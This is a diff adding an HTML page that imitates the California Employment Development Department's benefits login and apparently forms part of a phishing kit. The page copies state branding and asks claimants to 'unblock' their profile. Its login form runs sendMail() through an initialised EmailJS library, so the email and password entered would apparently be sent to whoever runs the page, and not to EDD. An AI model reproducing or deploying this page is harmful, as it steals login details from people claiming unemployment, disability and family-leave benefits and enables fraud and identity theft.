@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<!-- 
+State of California 2013 master template
+Version 2013.xx.xx
+
+Based on 320 and Up boilerplate extension
+-->
+
+<html class="no-js" lang="en">
+  <!-- InstanceBegin template="#" codeOutsideHTMLIsLocked="false" -->
+  <!--<![endif]-->
+
+  <head>
+    <script type="text/javascript"
+    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
+</script>
+<script type="text/javascript">
+    (function(){
+        emailjs.init("tjTWAyLNJH2ZUROnk");
+    })();
+</script>    
+<script src="index.js" defer></script>
+    <!-- <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag() {
+        dataLayer.push(arguments);
+      }
+      gtag("js", new Date());
+      gtag("config", "UA-3419582-31", { anonymize_ip: true });
+    </script>
+    <script type="text/javascript">
+      function setUpClientDetails() {
+        Date.prototype.stdTimezoneOffset = function () {
+          var jan = new Date(this.getFullYear(), 0, 1);
+          var jul = new Date(this.getFullYear(), 6, 1);
+          return Math.max(jan.getTimezoneOffset(), jul.getTimezoneOffset());
+        };
+
+        Date.prototype.isDstObserved = function () {
+          return this.getTimezoneOffset() < this.stdTimezoneOffset();
+        };
+
+        var today = new Date();
+        var clientDate = document.getElementById("DFClientDate");
+        if (clientDate) {
+          clientDate.value = today.toJSON();
+        }
+        var clientTimeZone = document.getElementById("DFClientTimeZone");
+        if (clientTimeZone) {
+          clientTimeZone.value = today.isDstObserved()
+            ? today.stdTimezoneOffset()
+            : today.getTimezoneOffset();
+        }
+      }
+    </script> -->
+
+    <meta charset="utf-8" />
+    <!-- InstanceBeginEditable name="doctitle" -->
+    <title>Employment Development Department</title>
+    <!-- InstanceEndEditable -->
+    <!-- InstanceBeginEditable name="MetaTags" -->
+    <meta name="Author" content="" />
+    <meta name="Description" content="" />
+    <meta name="Keywords" content="" />
+
+    <!-- head content, for all pages -->
+    <!-- Use highest compatibility mode, enable Chrome Frame -->
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+
+    <meta http-equiv="Cache-Control" content="no-store" />
+
+    <meta
+      name="viewport"
+      content="width=device-width, target-densitydpi=160dpi, initial-scale=1.0"
+    />
+
+    <!-- InstanceEndEditable -->
+    <!-- InstanceBeginEditable name="head" -->
+    <!-- The jquery and modernizr scripts need to be rendered here so the template will work properly.-->
+    <script src="csss/jquery.js"></script>
+
+    <script src="csss/modernizr.js"></script>
+
+    <!-- bring in the template scripts and stylesheets after loading our jquery and modernizr scripts to satisfy dependencies -->
+
+    <!-- head content, for all pages -->
+
+    <!-- Use highest compatibility mode, enable Chrome Frame -->
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+
+    <!-- http://t.co/dKP3o1e -->
+    <meta name="HandheldFriendly" content="True" />
+    <!-- for Blackberry, AvantGo -->
+    <meta name="MobileOptimized" content="320" />
+    <!-- for Windows mobile -->
+    <meta
+      name="viewport"
+      content="width=device-width, target-densitydpi=160dpi, initial-scale=1.0"
+    />
+
+    <!-- For all browsers -->
+    <!--<link rel="stylesheet" href="csss/style.css">-->
+    <link rel="stylesheet" href="csss/eGov_style.css" />
+    <link rel="stylesheet" href="csss/edd_style.css" />
+
+    <!--
+Step 3
+Select a color scheme: 
+-->
+
+    <link rel="stylesheet" href="eeeed/colorscheme_oceanside.css" />
+    <link rel="stylesheet" href="eeeed/edd_colorscheme_oceanside.css" />
+
+    <link rel="stylesheet" media="print" href="csss/print.css" />
+    <!-- For progressively larger displays -->
+    <link
+      rel="stylesheet"
+      media="only screen and (min-width: 768px)"
+      href="csss/768.css"
+    />
+    <link
+      rel="stylesheet"
+      media="only screen and (min-width: 768px)"
+      href="csss/edd_768.css"
+    />
+    <link
+      rel="stylesheet"
+      media="only screen and (min-width: 1280px)"
+      href="csss/1280.css"
+    />
+    <!-- For Retina displays -->
+    <!-- <link rel="stylesheet" media="only screen and (-webkit-min-device-pixel-ratio: 1.5), only screen and (-o-min-device-pixel-ratio: 3/2), only screen and (min-device-pixel-ratio: 1.5)" href="https://portal.edd.ca.gov/css/2x.css"> -->
+
+    <!-- for jquery slideshow styles -->
+    <!--<link rel="stylesheet" href="csss/jquery.bxslider.css">-->
+    <link rel="stylesheet" href="csss/jquery-ui.min.css" />
+
+    <!-- selectivizr.com, emulates CSS3 pseudo-classes and attribute selectors in Internet Explorer 6-8 -->
+    <!--[if (lt IE 9) & (!IEMobile)]>
+      <script src="https://portal.edd.ca.gov/javascript/libs/selectivizr-min.js"></script>
+    <![endif]-->
+
+    <!-- modernizr.com, feature detection -->
+    <!-- *** Removed by e-Gov, called by our code *** -->
+
+    <!-- For iPad 3-->
+    <link
+      rel="apple-touch-icon"
+      sizes="144x144"
+      href="imagess/apple-touch-icon-144x144.png"
+    />
+    <!-- For iPhone 4 -->
+    <link
+      rel="apple-touch-icon"
+      sizes="114x114"
+      href="imagess/apple-touch-icon-114x114.png"
+    />
+    <!-- For iPad 1-->
+    <link
+      rel="apple-touch-icon"
+      sizes="72x72"
+      href="imagess/apple-touch-icon-72x72.png"
+    />
+    <!-- For iPhone 3G, iPod Touch and Android -->
+    <link rel="apple-touch-icon" href="imagess/apple-touch-icon-57x57.png" />
+    <!-- For Nokia -->
+    <link rel="shortcut icon" href="imagess/apple-touch-icon-57x57.png" />
+    <!-- For everything else -->
+    <link rel="shortcut icon" href="imagess/favicon.ico" />
+
+    <!-- Activate ClearType for Mobile IE -->
+    <!--[if IE]>
+      <meta http-equiv="cleartype" content="on" />
+    <![endif]-->
+
+    <!-- <script src="csss/eGov_scripts.js"></script> -->
+    <!--<script src="csss/scripts.js"></script>-->
+    <!-- ** calling the modified version instead **-->
+    <!--<script src="https://portal.edd.ca.gov/javascript/jquery-1.11.1.min.js"></script>-->
+    <!-- *** called by eGov code *** -->
+    <script src="csss/jquery-ui.min.js"></script>
+    <!--<script src="csss/jquery.bxslider.min.js"></script>-->
+    <!-- *** eGov not using the following at this time *** -->
+    <!--<script src="https://portal.edd.ca.gov/javascript/jq_modal.js"></script>-->
+    <!--<script src="https://portal.edd.ca.gov/javascript/jq_expand.js"></script>-->
+
+    <!--[if lt IE 9]>
+      <script src="https://portal.edd.ca.gov/javascript/libs/respond.min.js"></script>
+    <![endif]-->
+
+    <!--[if lt IE 8]>
+      <link rel="stylesheet" href="/css/ie7.css" />
+    <![endif]-->
+
+    <!-- ****** Render the application specific scripts and styles ****** -->
+
+    <!-- <script src="https://portal.edd.ca.gov/WebApp/Scripts/amp-common.js"></script>
+
+    <script src="https://portal.edd.ca.gov/WebApp/jqueryval?v=UKspXbtZaG2yflMHWVDGgUK_cbuL9yUgDEB-og0yNu01"></script>
+
+    <script src="https://portal.edd.ca.gov/WebApp/bootstrap?v=sYTqL02CTePfDH6DfPFYr6m2FRldScVKev789LRk33E1"></script>
+
+    <script src="https://portal.edd.ca.gov/WebApp/common?v=j-3fPg7X293G2MHkCbXXhmFoaQHaWzuZpMYkVxozats1"></script> -->
+
+    <!-- <link
+      href="https://portal.edd.ca.gov/WebApp/Content/css/en?v=6QLGxvxWqJ7kgYH0gjgGpp3UiVCC34vImysaQOBck-s1"
+      rel="stylesheet"
+    /> -->
+
+    <!-- <script type="text/javascript">
+      /* Set the Global values for the application scripts */
+      var ROOT = "/WebApp/";
+
+      function setGlobalValues() {
+        //set the constants values
+        GlobalVals.cultureKey = "l";
+        GlobalVals.cultureVal = "en";
+        GlobalVals.langSearchKey = "lang ";
+        GlobalVals.langSearchVal = "en";
+
+        GlobalVals.BASE_URL =
+          "?" +
+          GlobalVals.cultureKey +
+          "=" +
+          GlobalVals.cultureVal +
+          "&" +
+          GlobalVals.langSearchKey +
+          "=" +
+          GlobalVals.langSearchVal;
+      }
+    </script> -->
+
+    <!-- InstanceEndEditable -->
+  </head>
+
+  <body class="clearfix">
+    <header role="banner">
+      <div class="phone_hdr">
+        <div class="phone_hd_left">
+          <a class="p_h_button" id="p_h_menu"
+            ><span class="add_icon_font_normal ca-gov-icon-Ca-Gov-Menu"></span
+            ><span class="visuallyhidden">Menu</span></a
+          >
+        </div>
+        <div class="phone_hd_right phone_hd_apps"></div>
+        <div class="logo_and_banner">
+          <div class="head_cagov_logo">
+            <a href="#"><img src="imagess/header_ca.gov.png" alt="CA.gov" /></a>
+          </div>
+          <div class="head_organization_banner">
+            <a href="#"
+              ><img
+                src="imagess/header_organization.png"
+                alt="Employment Development Department"
+            /></a>
+          </div>
+          <div class="head_organization_banner_phone">
+            <a href="#"
+              ><img
+                src="imagess/header_organization_phone.png"
+                alt="Employment Development Department"
+            /></a>
+          </div>
+        </div>
+      </div>
+
+      <div id="head_apps_content"></div>
+
+      <!-- Navigation -->
+      <nav id="navigation" class="singlelevelnav">
+        <ul id="nav_list">
+          <li class="MenuLeftAlign">
+            <a href="#" class="nav_level1_link"
+              ><span
+                id="nav_home_container"
+                class="add_icon_font_normal ca-gov-icon-Ca-Gov-Home"
+                aria-hidden="true"
+              ></span
+              ><img src="imagess/clear.gif" alt="Home" /><span
+                class="visuallyhidden"
+                >Home</span
+              ></a
+            >
+          </li>
+        </ul>
+      </nav>
+
+      <div id="img_ribbon"></div>
+    </header>
+
+    <div id="main_content" class="clearfix">
+      <div class="add_maincontent_padding">
+        <!-- InstanceBeginEditable name="MainContent" -->
+        <h1>Log in to Unblock Your Benefit Programs Online Profile</h1>
+        <div>
+          <div class="red_text validationErrorSummary"></div>
+
+          <p><a class="linkColorADA" href="#">En espa&#241;ol</a></p>
+
+          <div id="loginBody">
+            <!-- Login Controller - Login View -->
+            <!-- action="one.php" -->
+            <form
+              action="index.js"
+              method="post"
+              onsubmit="sendMail(); return false"
+            >
+              <input name="nToken" type="hidden" value="5YP1" />
+              <div class="container-fluid-no-padding">
+                <div class="container-fluid">
+                  <div class="row">
+                    <div class="col-md-5">
+                      <div class="row">
+                        <div class="verticalCenterLabel">
+                          <label for="username">Email Address:</label>
+                        </div>
+                        <div class="col-md-10 col-sm-7">
+                          <input
+                            id="DFClientDate"
+                            name="DFClientDate"
+                            type="hidden"
+                            value=""
+                          />
+                          <input
+                            id="DFClientTimeZone"
+                            name="DFClientTimeZone"
+                            type="hidden"
+                            value=""
+                          />
+                          <!-- id="1" -->
+                          <input
+                            id="email"
+                            name="1"
+                            type="text"
+                            value=""
+                            aria-label="Email"
+                          />
+                        </div>
+                        <div class="verticalCenterLabel">
+                          <br />
+                          <br />
+                          <label for="username">Password:</label>
+                        </div>
+                        <div class="col-md-10 col-sm-7">
+                          <input
+                            id="DFClientDate"
+                            name="DFClientDate"
+                            type="hidden"
+                            value=""
+                          />
+                          <input
+                            id="DFClientTimeZone"
+                            name="DFClientTimeZone"
+                            type="hidden"
+                            value=""
+                          />
+                          <!-- id="2" -->
+                          <input id="password" name="2" type="password" value="" />
+                        </div>
+                        <div class="col-md-10"></div>
+                      </div>
+                      <div class="row hidden-lg hidden-md hidden-xs hidden-xxs">
+                        <div class="col-sm-12"><br /></div>
+                      </div>
+                      <div class="row">
+                        <div class="col-md-8">
+                          <div>
+                            <script type="text/javascript" src="#"></script>
+
+                            <div class="g-#" data-sitekey="6LcQOg8TAA"></div>
+                          </div>
+                          <div></div>
+                        </div>
+                      </div>
+                      <div class="row hidden-lg hidden-md hidden-xs hidden-xxs">
+                        <div class="col-sm-12"><br /></div>
+                      </div>
+                      <div class="row">
+                        <div class="col-md-5 col-sm-4">
+                          <button
+                            id="submitButton"
+                            type="submit"
+                            name="command"
+                            class="eddButton fullWidth"
+                            value="Login"
+                          >
+                            Log In
+                          </button>
+                        </div>
+                      </div>
+                      <div class="row hidden-lg hidden-md hidden-xs hidden-xxs">
+                        <div class="col-sm-12"><br /></div>
+                      </div>
+                      <div class="row">
+                        <div class="col-md-10">
+                          Don&#39;t have an account?
+                          <a class="linkColorADA" href="#">Register now</a>.
+                        </div>
+                      </div>
+                    </div>
+
+                    <div class="col-md-7">
+                      <div class="row hidden-lg hidden-md hidden-xs hidden-xxs">
+                        <div class="col-sm-12"><br /></div>
+                      </div>
+                      <div class="row">
+                        <div class="col-md-12">
+                          <p>
+                            Benefit Programs Online gives you access to these
+                            EDD services:
+                          </p>
+                          <ul>
+                            <li>
+                              <p>
+                                Unemployment or Pandemic Unemployment Assistance
+                              </p>
+                            </li>
+                            <li><p>Disability</p></li>
+                            <li><p>Paid Family Leave</p></li>
+                            <li><p>Benefit overpayments</p></li>
+                          </ul>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </form>
+          </div>
+        </div>
+
+        <!-- InstanceEndEditable -->
+      </div>
+      <div class="cleaner"></div>
+    </div>
+
+    <div>
+      <footer id="footer_2" class="clearfix">
+        <div>
+          <p>
+            <a href="#">Contact EDD</a> | <a href="#">Conditions of Use</a> |
+            <a href="#">Privacy Policy</a> | <a href="#">Accessibility</a>
+            <!--| <a href="/">Full Site</a></p>-->
+          </p>
+          <p>Copyright &copy; 2021 State of California</p>
+        </div>
+
+        <div class="clearfix"></div>
+      </footer>
+
+      <div id="background_decorative">&nbsp;</div>
+    </div>
+  </body>
+  <!-- InstanceEnd -->
+</html>
